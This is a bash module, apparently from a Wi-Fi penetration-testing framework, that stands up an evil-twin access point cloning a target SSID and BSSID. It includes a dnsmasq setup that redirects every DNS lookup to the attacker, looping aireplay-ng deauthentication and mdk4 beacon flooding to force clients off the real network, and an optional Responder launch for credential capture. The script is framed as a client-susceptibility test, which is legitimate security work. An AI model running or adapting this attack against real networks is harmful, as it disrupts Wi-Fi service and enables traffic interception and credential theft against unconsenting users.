#!/usr/bin/env bash
# MODULE_META
# NAME="Rogue AP / Evil Twin"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd,dnsmasq,iptables,mdk4"
# DESC="Deploy evil twin AP to test client susceptibility and WIDS response"
# REQS="managed_iface,target_ssid,nat"
# PCAP="yes"
# TIMED="yes"
# PROMPTS="rogue_ap_mode,roaming_catalyst"
# DECODE="dhcp"

#===============================================================================
#  modules/f1_rogue_ap.sh
#  F1: Rogue AP / Evil Twin (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Use tactical options (AP_MODE, CATALYST) from Go brain.
#  2. Deploy rogue AP via hostapd.
#  3. Provide synchronized NAT/DNS via Go-Brain and local dnsmasq.
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
EVIDENCE_PREFIX="${EVIDENCE_DIR}/f1"
SCAN_TIME="${SCAN_TIME:-120}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F1"
INTERNAL_IP="${INTERNAL_IP:-192.168.44.1}"

# Tactical Selections from Go Brain
AP_MODE="${AP_MODE:-ssid}" # ssid or clone
CATALYST="${CATALYST:-0}" # 0=None, 1=Deauth, 2=CSA
LAUNCH_RESPONDER="${LAUNCH_RESPONDER:-no}"

if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
    echo "[!] WIFI_INTERFACE or GUEST_SSID not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting Rogue AP mission for SSID: ${C_VAR}${SSID}${C_RESET}..."

# 1. Configuration
BSSID_LINE=""
if [[ "$AP_MODE" == "clone" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo -e "[*] Cloning BSSID: ${C_VAR}$TARGET_BSSID${C_RESET}"
    BSSID_LINE="bssid=$TARGET_BSSID"
fi

HOSTAPD_CONF="${EVIDENCE_PREFIX}_hostapd.conf"
DNSMASQ_CONF="${EVIDENCE_PREFIX}_dnsmasq.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid="$SSID"
$BSSID_LINE
hw_mode=g
channel=${GUEST_CHANNEL:-6}
auth_algs=1
wpa=0
EOF

cat <<EOF > "$DNSMASQ_CONF"
interface=$INTERFACE
dhcp-range=192.168.44.10,192.168.44.100,12h
dhcp-option=3,$INTERNAL_IP
dhcp-option=6,$INTERNAL_IP
address=/#/$INTERNAL_IP
log-queries
log-dhcp
EOF

# 2. Execution
cleanup() {
    echo -e "${C_PROMPT}[*]${C_RESET} Tearing down Rogue AP environment..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
    [[ -n "${CAT_PID:-}" ]] && kill "$CAT_PID" 2>/dev/null || true
    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
}
trap cleanup EXIT

# Start dynamic telemetry heartbeat
(
    ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $SCAN_TIME ]]; do
        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
        STATUS="AP Active (monitoring roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
        sleep 5
        ((ELAPSED+=5))
    done
) &
TEL_PID=$!

echo -e "[*] Starting services (NAT established by Brain)..."
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    dnsmasq -C "$DNSMASQ_CONF" -k 2>&1 | tee "$DNSMASQ_LOG" &
else
    dnsmasq -C "$DNSMASQ_CONF" -k --log-facility="$DNSMASQ_LOG" &
fi
DNSMASQ_PID=$!

# Roaming Catalyst Execution (Pre-launch for Window Mode)
if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
    echo -e "[*] Starting ${C_BOLD}Surgical Deauth Catalyst${C_RESET} against $TARGET_BSSID..."
    (
        while true; do
            if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
            else
                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
            fi
            sleep 20
        done
    ) &
    CAT_PID=$!
elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]] && command -v mdk4 &>/dev/null; then
    echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID..."
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        mdk4 "$INTERFACE" b -n "$SSID" -c "${GUEST_CHANNEL:-6}" &
    else
        mdk4 "$INTERFACE" b -n "$SSID" -c "${GUEST_CHANNEL:-6}" > /dev/null 2>&1 &
    fi
    CAT_PID=$!
fi

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # FOREGROUND
    timeout "$SCAN_TIME" hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" || true
else
    # BACKGROUND
    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
    HOSTAPD_PID=$!
    sleep "$SCAN_TIME"
fi

# Responder Support Module
if [[ "$LAUNCH_RESPONDER" == "yes" ]]; then
    echo -e "[*] Requesting background Responder pivot..."
    "$ASTRA_BIN" launch-support --tc "G6" --session-dir "$SESSION_DIR"
fi

cleanup
trap - EXIT

# 4. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo -e "[!] ${C_BOLD}SUCCESS: CLIENT CONNECTED TO ROGUE AP!${C_RESET}"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Rogue AP Susceptibility" \
        --severity CRITICAL \
        --desc "A client device (${V_MAC:-Unknown}) automatically connected to the rogue AP with SSID: $SSID." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Automatic connection to unauthorized Access Points allows full traffic interception."
else
    echo -e "[+] Mission complete. No rogue connections identified."
fi


# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
